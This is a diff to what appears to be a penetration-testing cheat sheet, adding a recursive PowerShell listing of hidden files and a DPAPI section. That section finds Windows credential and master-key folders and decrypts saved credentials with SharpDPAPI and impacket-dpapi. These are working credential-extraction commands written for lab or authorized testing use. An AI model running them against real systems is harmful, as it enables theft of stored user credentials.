@@ -1149,6 +1149,21 @@ impacket-findDelegation htb.LOCAL/user:pass
 # Users file
 tree /f
 Get-ChildItem -force
+# hidden tree
+function Show-Tree {
+    param (
+        [string]$Path = ".",
+        [int]$Level = 0
+    )
+    $indent = " " * ($Level * 2)
+    Get-ChildItem -Path $Path -Force | ForEach-Object {
+        Write-Output "$indent|- $_"
+        if ($_.PSIsContainer) {
+            Show-Tree -Path $_.FullName -Level ($Level + 1)
+        }
+    }
+}
+Show-Tree -Path "C:\Users"
 # hidden
 dir /a
 
@@ -1198,6 +1213,18 @@ tasklist /svc /FI "PID eq 336"
 
 # Writeable folder
 icacls C:\xampp\
+
+# dpapi
+Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+dir C:\Users\USER\AppData\Roaming\Microsoft\Protect\
+dir C:\Users\USER\AppData\Local\Microsoft\Protect\
+.\SharpDPAPI.exe triage
+## decrypt
+impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'pass' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
+impacket-dpapi credential -f C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fb
+
+.\SharpDPAPI.exe credentials /password:'pass' /unprotect
 ```
 
 ## Linux
@@ -1894,7 +1921,7 @@ sudo ip link delete ligolo
 
 ## SMB
 ```bash
-impacket-smbserver work /root/work -smb2support
+impacket-smbserver work ./work -smb2support
 
 copy  \\192.168.\test.zip
 xcopy Win32\* \\FILE04\c$\Windows\Temp\ /s /e
